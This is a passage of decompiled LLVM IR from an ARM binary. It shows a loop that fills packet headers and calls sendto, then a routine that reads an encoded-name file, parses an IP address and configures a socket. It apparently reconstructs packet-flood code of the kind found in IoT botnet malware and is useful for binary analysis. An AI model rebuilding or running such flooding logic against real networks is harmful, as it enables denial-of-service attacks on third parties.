  %v2_b530 = inttoptr i32 %v1_b530 to i8*
  %v3_b530 = load i8, i8* %v2_b530, align 1
  %v4_b530 = zext i8 %v3_b530 to i32
  store i32 %v4_b530, i32* %r3.global-to-local, align 4
  %v1_b534 = add i32 %v0_b530, 25
  %v2_b534 = inttoptr i32 %v1_b534 to i8*
  %v3_b534 = load i8, i8* %v2_b534, align 1
  %v4_b534 = zext i8 %v3_b534 to i32
  %v4_b538 = mul nuw nsw i32 %v4_b534, 256
  %v5_b538 = or i32 %v4_b538, %v4_b530
  store i32 %v5_b538, i32* %r2.global-to-local, align 4
  %v3_b53c = load i32, i32* %stack_var_-44, align 4
  %v0_b540 = load i32, i32* @r6, align 4
  store i32 %v0_b540, i32* @r1, align 4
  %v1_b544 = add i32 %v3_b53c, 12
  store i32 %v1_b544, i32* %r3.global-to-local, align 4
  %v4_b54c = call i32 @function_de50(i32 %v0_b530, i32 %v0_b540, i32 %v5_b538, i32 %v1_b544)
  %v5_b54c = trunc i32 %v4_b54c to i8
  %v4_b55025 = udiv i32 %v4_b54c, 256
  %v1_b554 = trunc i32 %v4_b55025 to i8
  %v2_b554 = load i32, i32* @r6, align 4
  %v3_b554 = add i32 %v2_b554, 7
  %v4_b554 = inttoptr i32 %v3_b554 to i8*
  store i8 %v1_b554, i8* %v4_b554, align 1
  %v3_b558 = load i32, i32* @r6, align 4
  %v4_b558 = add i32 %v3_b558, 6
  %v5_b558 = inttoptr i32 %v4_b558 to i8*
  store i8 %v5_b54c, i8* %v5_b558, align 1
  %v3_b55c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b55c, i32* %r3.global-to-local, align 4
  %v0_b560 = load i32, i32* @r5, align 4
  %v1_b560 = add i32 %v0_b560, 20
  %v2_b560 = inttoptr i32 %v1_b560 to i32*
  %v3_b560 = load i32, i32* %v2_b560, align 4
  %v5_b568 = mul i32 %v3_b55c, 24
  %v1_b56c = load i32, i32* @sl, align 4
  %v2_b56c = add i32 %v1_b56c, %v5_b568
  store i32 %v2_b56c, i32* %ip.global-to-local, align 4
  %v3_b570 = udiv i32 %v3_b560, 65536
  store i32 %v3_b570, i32* %r2.global-to-local, align 4
  %v1_b574 = trunc i32 %v3_b570 to i8
  %v3_b574 = add i32 %v2_b56c, 2
  %v4_b574 = inttoptr i32 %v3_b574 to i8*
  store i8 %v1_b574, i8* %v4_b574, align 1
  %v0_b578 = load i32, i32* %r2.global-to-local, align 4
  %v3_b57826 = udiv i32 %v0_b578, 256
  %v3_b57c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b57c, i32* %r2.global-to-local, align 4
  %v1_b580 = trunc i32 %v3_b57826 to i8
  %v2_b580 = load i32, i32* %ip.global-to-local, align 4
  %v3_b580 = add i32 %v2_b580, 3
  %v4_b580 = inttoptr i32 %v3_b580 to i8*
  store i8 %v1_b580, i8* %v4_b580, align 1
  %v0_b584 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b58c = load i32, i32* %r2.global-to-local, align 4
  %v1_b58c = add i32 %v0_b58c, 32
  store i32 %v1_b58c, i32* %r2.global-to-local, align 4
  %v0_b590 = load i32, i32* %fp.global-to-local, align 4
  %v0_b598 = load i32, i32* %ip.global-to-local, align 4
  %v4_b598 = inttoptr i32 %v0_b598 to %sockaddr*
  %v7_b5a0 = inttoptr i32 %v0_b584 to i32*
  %v9_b5a0 = call i32 @sendto(i32 %v0_b590, i32* %v7_b5a0, i32 %v1_b58c, i32 16384, %sockaddr* %v4_b598, i32 16)
  %v3_b5a4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b5a4, i32* %r3.global-to-local, align 4
  %v1_b5a8 = add i32 %v3_b5a4, 1
  %v1_b5ac = load i32, i32* %sb.global-to-local, align 4
  %v9_b5ac = icmp eq i32 %v1_b5a8, %v1_b5ac
  store i1 %v9_b5ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b5a8, i32* %stack_var_-40, align 4
  %v5_b5b4 = icmp slt i32 %v1_b5a8, %v1_b5ac
  br i1 %v5_b5b4, label %dec_label_pc_b4b8, label %dec_label_pc_b5b8

dec_label_pc_b5b8:                                ; preds = %dec_label_pc_b508
  %v2_b5b8 = icmp eq i32 %v1_b5ac, 0
  store i1 %v2_b5b8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b4a8.outer

dec_label_pc_b5c4:                                ; preds = %dec_label_pc_b4b8
  %v1_b5c4 = add i32 %v2_b4c0, 16
  %v2_b5c4 = inttoptr i32 %v1_b5c4 to i32*
  %v3_b5c4 = load i32, i32* %v2_b5c4, align 4
  store i32 %v3_b5c4, i32* @r4, align 4
  %v0_b5c8 = call i32 @function_f67c()
  %v3_b5cc = load i32, i32* %stack_var_-40, align 4
  %v5_b5d4 = mul i32 %v3_b5cc, 24
  %v0_b5d8 = load i32, i32* @r4, align 4
  %v1_b5dc = and i32 %v0_b5d8, 65280
  store i32 %v1_b5dc, i32* %r3.global-to-local, align 4
  %v1_b5d8 = udiv i32 %v0_b5d8, 256
  %v3_b5e0 = and i32 %v1_b5d8, 65280
  store i32 %v3_b5e0, i32* %r2.global-to-local, align 4
  %v1_b5e4 = load i32, i32* @sl, align 4
  %v2_b5e4 = add i32 %v1_b5e4, %v5_b5d4
  store i32 %v2_b5e4, i32* %ip.global-to-local, align 4
  %v1_b5f0 = add i32 %v2_b5e4, 20
  %v2_b5f0 = inttoptr i32 %v1_b5f0 to i8*
  %v3_b5f0 = load i8, i8* %v2_b5f0, align 1
  %v4_b5f0 = zext i8 %v3_b5f0 to i32
  store i32 %v4_b5f0, i32* %lr.global-to-local, align 4
  %v2_b5f8 = call i32 @llvm.bswap.i32(i32 %v0_b5d8)
  %v7_b5fc = lshr i32 %v0_b5c8, %v4_b5f0
  %v8_b5fc = add i32 %v7_b5fc, %v2_b5f8
  store i32 %v3_b310, i32* %r2.global-to-local, align 4
  %v2_b61c = call i32 @llvm.bswap.i32(i32 %v8_b5fc)
  store i32 %v2_b61c, i32* %r3.global-to-local, align 4
  %v1_b620 = load i32, i32* %r7.global-to-local, align 4
  %v9_b620 = icmp eq i32 %v3_b310, %v1_b620
  store i1 %v9_b620, i1* %cpsr_z.global-to-local, align 1
  %v1_b624 = load i32, i32* @r5, align 4
  %v2_b624 = add i32 %v1_b624, 16
  %v3_b624 = inttoptr i32 %v2_b624 to i32*
  store i32 %v2_b61c, i32* %v3_b624, align 4
  br i1 %v9_b620, label %dec_label_pc_b62c, label %dec_label_pc_b5c4.dec_label_pc_b4f0_crit_edge

dec_label_pc_b5c4.dec_label_pc_b4f0_crit_edge:    ; preds = %dec_label_pc_b5c4
  %v1_b4f4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_b4f0

dec_label_pc_b62c:                                ; preds = %dec_label_pc_b5c4, %dec_label_pc_b4e4
  %v0_b62c = call i32 @function_f67c()
  %v1_b62c = trunc i32 %v0_b62c to i8
  %v4_b63027 = udiv i32 %v0_b62c, 256
  %v1_b634 = trunc i32 %v4_b63027 to i8
  %v2_b634 = load i32, i32* @r5, align 4
  %v3_b634 = add i32 %v2_b634, 5
  %v4_b634 = inttoptr i32 %v3_b634 to i8*
  store i8 %v1_b634, i8* %v4_b634, align 1
  store i32 %v3_b314, i32* %r3.global-to-local, align 4
  %v1_b63c = load i32, i32* %r7.global-to-local, align 4
  %v9_b63c = icmp eq i32 %v3_b314, %v1_b63c
  store i1 %v9_b63c, i1* %cpsr_z.global-to-local, align 1
  %v3_b640 = load i32, i32* @r5, align 4
  %v4_b640 = add i32 %v3_b640, 4
  %v5_b640 = inttoptr i32 %v4_b640 to i8*
  store i8 %v1_b62c, i8* %v5_b640, align 1
  %v0_b644 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b644, label %dec_label_pc_b648, label %dec_label_pc_b62c.dec_label_pc_b4fc_crit_edge

dec_label_pc_b62c.dec_label_pc_b4fc_crit_edge:    ; preds = %dec_label_pc_b62c
  %v1_b500.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_b4fc

dec_label_pc_b648:                                ; preds = %dec_label_pc_b62c, %dec_label_pc_b4f0
  %v0_b648 = call i32 @function_f67c()
  %v1_b648 = trunc i32 %v0_b648 to i8
  %v4_b650 = sdiv i32 %v0_b648, 256
  store i32 %v4_b650, i32* %r3.global-to-local, align 4
  %v1_b654 = load i32, i32* %r7.global-to-local, align 4
  %v9_b654 = icmp eq i32 %v3_b318, %v1_b654
  store i1 %v9_b654, i1* %cpsr_z.global-to-local, align 1
  %v3_b658 = load i32, i32* @r5, align 4
  %v4_b658 = add i32 %v3_b658, 20
  %v5_b658 = inttoptr i32 %v4_b658 to i8*
  store i8 %v1_b648, i8* %v5_b658, align 1
  %v0_b65c = load i32, i32* %r3.global-to-local, align 4
  %v1_b65c = trunc i32 %v0_b65c to i8
  %v2_b65c = load i32, i32* @r6, align 4
  %v3_b65c = add i32 %v2_b65c, 1
  %v4_b65c = inttoptr i32 %v3_b65c to i8*
  store i8 %v1_b65c, i8* %v4_b65c, align 1
  %v0_b660 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b660, label %dec_label_pc_b664, label %dec_label_pc_b508

dec_label_pc_b664:                                ; preds = %dec_label_pc_b648, %dec_label_pc_b4fc
  %v0_b664 = call i32 @function_f67c()
  %v1_b664 = trunc i32 %v0_b664 to i8
  %v4_b668 = sdiv i32 %v0_b664, 256
  store i32 %v4_b668, i32* %r3.global-to-local, align 4
  %v1_b66c = trunc i32 %v4_b668 to i8
  %v2_b66c = load i32, i32* @r6, align 4
  %v3_b66c = add i32 %v2_b66c, 3
  %v4_b66c = inttoptr i32 %v3_b66c to i8*
  store i8 %v1_b66c, i8* %v4_b66c, align 1
  %v3_b670 = load i32, i32* @r6, align 4
  %v4_b670 = add i32 %v3_b670, 2
  %v5_b670 = inttoptr i32 %v4_b670 to i8*
  store i8 %v1_b664, i8* %v5_b670, align 1
  br label %dec_label_pc_b508

dec_label_pc_b678:                                ; preds = %dec_label_pc_b2d8
  %v0_b678 = load i32, i32* %fp.global-to-local, align 4
  %v1_b67c = call i32 @close(i32 %v0_b678)
  br label %dec_label_pc_b680

dec_label_pc_b680:                                ; preds = %dec_label_pc_b1c8, %dec_label_pc_b678
  %v29_b684 = phi i32 [ -1, %dec_label_pc_b1c8 ], [ %v1_b67c, %dec_label_pc_b678 ]
  store i32 %v3_b1c8, i32* %r4.global-to-local, align 4
  store i32 %v6_b1c8, i32* %r5.global-to-local, align 4
  store i32 %v9_b1c8, i32* %r6.global-to-local, align 4
  store i32 %v12_b1c8, i32* %r7.global-to-local, align 4
  ret i32 %v29_b684

; uselistorder directives
  uselistorder i32 %v4_b668, { 1, 0 }
  uselistorder i32 %v2_b61c, { 1, 0 }
  uselistorder i32 %v0_b5d8, { 1, 0, 2 }
  uselistorder i1 %v2_b5b8, { 1, 0 }
  uselistorder i32 %v1_b5ac, { 0, 2, 3, 1 }
  uselistorder i32 %v1_b5a8, { 2, 0, 3, 1 }
  uselistorder i32 %v3_b570, { 1, 0 }
  uselistorder i32 %v4_b51c, { 1, 0 }
  uselistorder i32 %v1_b490, { 1, 0, 2, 3 }
  uselistorder i32 %v1_b434, { 1, 0 }
  uselistorder i32 %v1_b3bc, { 1, 0 }
  uselistorder i32 %v1_b33c, { 1, 0 }
  uselistorder i32 %v1_b338, { 1, 0 }
  uselistorder i32 %v3_b310, { 0, 1, 3, 2 }
  uselistorder i32 %v0_b308, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_b300, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_b268, { 1, 0 }
  uselistorder i8 %v5_b258, { 1, 0 }
  uselistorder i32 %v5_b23c, { 1, 0 }
  uselistorder i32 %v6_b200, { 1, 0 }
  uselistorder i32 %v1_b1cc, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 1, 13, 12 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 4, 1, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 0, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder label %dec_label_pc_b680, { 1, 0 }
  uselistorder label %dec_label_pc_b508, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b4a8, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_b68c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b68c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-2120 = alloca i32, align 4
  %v3_b68c = load i32, i32* @r4, align 4
  %v6_b68c = load i32, i32* @r5, align 4
  %v9_b68c = load i32, i32* @r6, align 4
  %v12_b68c = load i32, i32* @r7, align 4
  %v15_b68c = load i32, i32* @r8, align 4
  %v18_b68c = load i32, i32* @sb, align 4
  %v21_b68c = load i32, i32* @sl, align 4
  %v24_b68c = load i32, i32* @fp, align 4
  %v1_b698 = urem i32 %arg1, 256
  store i32 %v1_b698, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b6a4 = urem i32 %arg3, 256
  store i32 %v1_b6a4, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_b6b0 = call i32* @calloc(i32 %v1_b698, i32 4)
  %v4_b6b0 = ptrtoint i32* %v2_b6b0 to i32
  %v0_b6b4 = load i32, i32* @r5, align 4
  store i32 %v0_b6b4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_b6c0 = load i32, i32* @r4, align 4
  store i32 %v0_b6c0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_b6c8 = inttoptr i32 %v0_b6b4 to i32*
  %v6_b6c8 = call i32 @function_92dc(i32 %v0_b6c0, i32* %v5_b6c8, i32 2, i32 0)
  %v1_b6d4 = urem i32 %v6_b6c8, 256
  store i32 %v1_b6d4, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b6e0 = load i32, i32* @r4, align 4
  store i32 %v0_b6e0, i32* %r0.global-to-local, align 4
  %v0_b6e4 = load i32, i32* @r5, align 4
  store i32 %v0_b6e4, i32* %r1.global-to-local, align 4
  %v5_b6e8 = trunc i32 %v6_b6c8 to i8
  %v6_b6ec = inttoptr i32 %v0_b6e4 to i32*
  %v7_b6ec = call i32 @function_92dc(i32 %v0_b6e0, i32* %v6_b6ec, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_b6f0 = load i32, i32* @r5, align 4
  store i32 %v0_b6f0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_b6fc = load i32, i32* @r4, align 4
  store i32 %v0_b6fc, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_b704 = inttoptr i32 %v0_b6f0 to i32*
  %v6_b704 = call i32 @function_92dc(i32 %v0_b6fc, i32* %v5_b704, i32 4, i32 64)
  %v1_b70c = urem i32 %v6_b704, 256
  store i32 %v1_b70c, i32* %ip.global-to-local, align 4
  %v0_b710 = load i32, i32* @r5, align 4
  store i32 %v0_b710, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b71c = load i32, i32* @r4, align 4
  store i32 %v0_b71c, i32* %r0.global-to-local, align 4
  %v6_b724 = inttoptr i32 %v0_b710 to i32*
  %v7_b724 = call i32 @function_92dc(i32 %v0_b71c, i32* %v6_b724, i32 5, i32 0)
  %v1_b730 = urem i32 %v7_b724, 256
  store i32 %v1_b730, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b73c = load i32, i32* @r4, align 4
  store i32 %v0_b73c, i32* %r0.global-to-local, align 4
  %v0_b740 = load i32, i32* @r5, align 4
  store i32 %v0_b740, i32* %r1.global-to-local, align 4
  %v5_b748 = inttoptr i32 %v0_b740 to i32*
  %v6_b748 = call i32 @function_92dc(i32 %v0_b73c, i32* %v5_b748, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_b74c = load i32, i32* @r5, align 4
  store i32 %v0_b74c, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  store i32 %v6_b748, i32* %fp.global-to-local, align 4
  %v0_b75c = load i32, i32* @r4, align 4
  store i32 %v0_b75c, i32* %r0.global-to-local, align 4
  %v4_b760 = inttoptr i32 %v0_b74c to i32*
  %v5_b760 = call i32 @function_92dc(i32 %v0_b75c, i32* %v4_b760, i32 7, i32 53)
  %v0_b768 = load i32, i32* @r5, align 4
  store i32 %v0_b768, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 %v5_b760, i32* %sb.global-to-local, align 4
  %v0_b778 = load i32, i32* @r4, align 4
  store i32 %v0_b778, i32* %r0.global-to-local, align 4
  %v4_b77c = inttoptr i32 %v0_b768 to i32*
  %v5_b77c = call i32 @function_92dc(i32 %v0_b778, i32* %v4_b77c, i32 9, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_b780 = load i32, i32* @r5, align 4
  store i32 %v0_b780, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 %v5_b77c, i32* @sl, align 4
  %v0_b790 = load i32, i32* @r4, align 4
  store i32 %v0_b790, i32* %r0.global-to-local, align 4
  %v4_b794 = inttoptr i32 %v0_b780 to i32*
  %v5_b794 = call i32 @function_92dc(i32 %v0_b790, i32* %v4_b794, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b7a0 = load i32, i32* @r5, align 4
  store i32 %v0_b7a0, i32* %r1.global-to-local, align 4
  store i32 %v5_b794, i32* %r8.global-to-local, align 4
  %v0_b7a8 = load i32, i32* @r4, align 4
  store i32 %v0_b7a8, i32* %r0.global-to-local, align 4
  %v4_b7ac = inttoptr i32 %v0_b7a0 to i32*
  %v5_b7ac = call i32 @function_8ec8(i32 %v0_b7a8, i32* %v4_b7ac, i32 8, i32 0)
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_b7b8 = call i32 @function_1134c(i32 21)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_b7c4 = call i32 @function_11268(i32 21, i32* null)
  %v4_b7c4 = inttoptr i32 %v3_b7c4 to i8*
  store i32 %v3_b7c4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_b7cc = call i32 (i8*, i32, ...) @open(i8* %v4_b7c4, i32 0)
  store i32 %v4_b7cc, i32* @r4, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_b7d8 = call i32 @function_11294(i32 21)
  store i32 %v1_b7d8, i32* %r0.global-to-local, align 4
  %v0_b7dc = load i32, i32* @r4, align 4
  %v1_b7dc = icmp slt i32 %v0_b7dc, 0
  %v2_b7dc = icmp eq i32 %v0_b7dc, 0
  store i1 %v2_b7dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_b7dc, label %dec_label_pc_bda8, label %dec_label_pc_b7e4

dec_label_pc_b7e4:                                ; preds = %dec_label_pc_b68c
  %v2_b7e8 = ptrtoint i32* %stack_var_-2120 to i32
  store i32 %v2_b7e8, i32* @r6, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 %v2_b7e8, i32* %r1.global-to-local, align 4
  store i32 %v0_b7dc, i32* %r0.global-to-local, align 4
  %v4_b7f8 = call i32 @read(i32 %v0_b7dc, i32* nonnull %stack_var_-2120, i32 2048)
  store i32 %v4_b7f8, i32* @r5, align 4
  %v0_b800 = load i32, i32* @r4, align 4
  store i32 %v0_b800, i32* %r0.global-to-local, align 4
  %v1_b804 = call i32 @close(i32 %v0_b800)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_b80c = call i32 @function_1134c(i32 22)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_b818 = call i32 @function_11268(i32 22, i32* null)
  %v0_b81c = load i32, i32* @r5, align 4
  store i32 %v0_b81c, i32* @r1, align 4
  store i32 %v3_b818, i32* %r2.global-to-local, align 4
  store i32 %v2_b7e8, i32* %r0.global-to-local, align 4
  %v3_b828 = bitcast i32* %stack_var_-2120 to i8*
  %v4_b828 = call i32 @function_11aec(i8* %v3_b828, i32 %v0_b81c, i32 %v3_b818)
  store i32 %v4_b828, i32* @r4, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_b834 = call i32 @function_11294(i32 22)
  store i32 %v1_b834, i32* %r0.global-to-local, align 4
  %v0_b838 = load i32, i32* @r4, align 4
  %v2_b838 = icmp eq i32 %v0_b838, -1
  store i1 %v2_b838, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b838, label %dec_label_pc_bda8, label %dec_label_pc_b840

dec_label_pc_b840:                                ; preds = %dec_label_pc_b7e4
  %v0_b840 = load i32, i32* @r5, align 4
  %v9_b840 = icmp eq i32 %v0_b840, %v0_b838
  store i1 %v9_b840, i1* %cpsr_z.global-to-local, align 1
  %v7_b844 = icmp sgt i32 %v0_b840, %v0_b838
  br i1 %v7_b844, label %dec_label_pc_b848, label %dec_label_pc_bda8

dec_label_pc_b848:                                ; preds = %dec_label_pc_b840
  store i32 %v0_b840, i32* %r3.global-to-local, align 4
  store i32 %v0_b838, i32* %r2.global-to-local, align 4
  %v0_b858 = load i32, i32* @r6, align 4
  %v2_b858 = add i32 %v0_b858, %v0_b838
  store i32 %v2_b858, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v2_b860 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_b860, i32* %r7.global-to-local, align 4
  %v1_b890 = add i32 %v0_b840, -1
  br label %dec_label_pc_b888

dec_label_pc_b86c:                                ; preds = %dec_label_pc_b8b0, %bb139
  %v9_b86c = icmp eq i32 %v0_b878, %v1_b890
  store i1 %v9_b86c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b86c, label %dec_label_pc_b8bc, label %dec_label_pc_b874

dec_label_pc_b874:                                ; preds = %dec_label_pc_b8a0, %dec_label_pc_b86c, %bb
  %v0_b8ac43 = phi i32 [ %v0_b8ac, %dec_label_pc_b8a0 ], [ %v0_b8ac44, %dec_label_pc_b86c ], [ %v0_b8ac, %bb ]
  %v0_b88c39 = phi i32 [ 0, %dec_label_pc_b8a0 ], [ %v0_b88c40, %dec_label_pc_b86c ], [ 0, %bb ]
  store i32 %v0_b840, i32* %r0.global-to-local, align 4
  %v1_b878 = add i32 %v0_b878, 1
  store i32 %v1_b878, i32* %r2.global-to-local, align 4
  %v9_b87c = icmp eq i32 %v0_b840, %v1_b878
  store i1 %v9_b87c, i1* %cpsr_z.global-to-local, align 1
  %v1_b880 = add i32 %v0_b880, 1
  store i32 %v1_b880, i32* %r7.global-to-local, align 4
  br i1 %v9_b87c, label %dec_label_pc_bda8, label %dec_label_pc_b888

dec_label_pc_b888:                                ; preds = %dec_label_pc_b874, %dec_label_pc_b848
  %v0_b880 = phi i32 [ %v1_b880, %dec_label_pc_b874 ], [ %v2_b860, %dec_label_pc_b848 ]
  %v0_b878 = phi i32 [ %v1_b878, %dec_label_pc_b874 ], [ %v0_b838, %dec_label_pc_b848 ]
  %v0_b8ac = phi i32 [ %v0_b8ac43, %dec_label_pc_b874 ], [ 0, %dec_label_pc_b848 ]
  %v0_b88c = phi i32 [ %v0_b88c39, %dec_label_pc_b874 ], [ 0, %dec_label_pc_b848 ]
  %v0_b894 = phi i32 [ %v1_b894, %dec_label_pc_b874 ], [ %v2_b858, %dec_label_pc_b848 ]
  %v1_b888 = inttoptr i32 %v0_b894 to i8*
  %v2_b888 = load i8, i8* %v1_b888, align 1
  %v3_b888 = zext i8 %v2_b888 to i32
  store i32 %v3_b888, i32* %r3.global-to-local, align 4
  %v2_b88c = icmp eq i32 %v0_b88c, 0
  store i1 %v2_b88c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b890, i32* %ip.global-to-local, align 4
  %v1_b894 = add i32 %v0_b894, 1
  store i32 %v1_b894, i32* %r1.global-to-local, align 4
  %v1_b898 = add nsw i32 %v3_b888, -48
  store i32 %v1_b898, i32* %r0.global-to-local, align 4
  br i1 %v2_b88c, label %dec_label_pc_b8a0, label %dec_label_pc_b8b0

dec_label_pc_b8a0:                                ; preds = %dec_label_pc_b888
  %v7_b8a0 = icmp eq i8 %v2_b888, 9
  store i1 %v7_b8a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b8a0, label %dec_label_pc_b874, label %bb

bb:                                               ; preds = %dec_label_pc_b8a0
  %v8_b8a4 = icmp eq i8 %v2_b888, 32
  store i1 %v8_b8a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_b8a4, label %dec_label_pc_b874, label %dec_label_pc_b8ac

dec_label_pc_b8ac:                                ; preds = %bb
  %v1_b8ac = add i32 %v0_b8ac, 1
  store i32 %v1_b8ac, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_b8b0

dec_label_pc_b8b0:                                ; preds = %dec_label_pc_b888, %dec_label_pc_b8ac
  %v0_b8ac44 = phi i32 [ %v0_b8ac, %dec_label_pc_b888 ], [ %v1_b8ac, %dec_label_pc_b8ac ]
  %v0_b88c40 = phi i32 [ %v0_b88c, %dec_label_pc_b888 ], [ %v1_b8ac, %dec_label_pc_b8ac ]
  %v7_b8b0 = icmp eq i8 %v2_b888, 46
  store i1 %v7_b8b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b8b0, label %dec_label_pc_b86c, label %bb139

bb139:                                            ; preds = %dec_label_pc_b8b0
  %v8_b8b4 = icmp eq i32 %v1_b898, 9
  store i1 %v8_b8b4, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_b898, 10
  br i1 %tmp, label %dec_label_pc_b86c, label %dec_label_pc_b8bc

dec_label_pc_b8bc:                                ; preds = %dec_label_pc_b86c, %bb139
  %v0_b878.lcssa = phi i32 [ %v1_b890, %dec_label_pc_b86c ], [ %v0_b878, %bb139 ]
  %v2_b8c0 = sub i32 %v0_b878.lcssa, %v0_b838
  store i32 %v2_b8c0, i32* %r2.global-to-local, align 4
  store i32 %v2_b858, i32* %r1.global-to-local, align 4
  store i32 %v2_b860, i32* %r0.global-to-local, align 4
  %v3_b8cc = call i32 @function_11814(i32 %v2_b860, i32 %v2_b858, i32 %v2_b8c0)
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp140 = bitcast i32* %stack_var_-72 to i8*
  store i32 %v2_b860, i32* %r0.global-to-local, align 4
  %v2_b8dc = load i32, i32* %r7.global-to-local, align 4
  %v3_b8dc = inttoptr i32 %v2_b8dc to i8*
  store i8 0, i8* %v3_b8dc, align 1
  %v3_b8e0 = call i32 @inet_addr(i8* %tmp140)
  store i32 %v3_b8e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b8e8

dec_label_pc_b8e821:                              ; preds = %dec_label_pc_bda8
  unreachable

dec_label_pc_b8e8:                                ; preds = %dec_label_pc_be20, %dec_label_pc_be10, %dec_label_pc_be04, %dec_label_pc_bdf0, %dec_label_pc_b8bc
